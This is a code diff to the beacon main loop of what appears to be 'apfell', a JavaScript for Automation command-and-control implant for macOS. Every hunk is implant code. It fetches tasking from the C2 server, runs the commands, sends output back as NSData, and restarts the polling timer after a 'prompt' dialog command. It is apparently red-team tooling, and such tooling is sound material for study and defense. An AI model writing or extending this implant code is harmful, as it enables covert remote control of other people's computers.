@@ -164,12 +164,11 @@ for(var i=0; i < apfell.ip.length; i++){
 //---------------------------MAIN LOOP ----------------------------------------
 sleepWakeUp = function(t){
 	var output = "";
-	//console.log("checking for tasking");
 
 	task = C2.getTasking();
-
+    var command = "";
 	try{
-		var command = ObjC.unwrap(task["command"]);
+		command = ObjC.unwrap(task["command"]);
 		if(command != "none"){
 			var params = ObjC.unwrap(task["params"]);
 			// params will either be a single parameter, string parameters, JSON of multiple params, or nothing
@@ -187,13 +186,21 @@ sleepWakeUp = function(t){
 			    }
 			}
 			if ((typeof output) == "string"){
+			    console.log("converting output to nsdata");
 			    output = convert_to_nsdata(output);
 			}
 			C2.postResponse(task, output);
 		}
 	}
 	catch(error){
-		C2.postResponse(task, error.toString());
+		C2.postResponse(task, convert_to_nsdata(error.toString()));
+	}
+	if(command == "prompt"){
+	    //Not sure why, but doing a dialog prompt appears to cause the nstimer to stop working? just do it again
+	    // all three steps seem to be required, and it makes a very slow exit from that function call...
+	    timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
+        $.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
+        $.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
 	}
 	task["command"] = "none"; //reset just in case something goes weird
 };
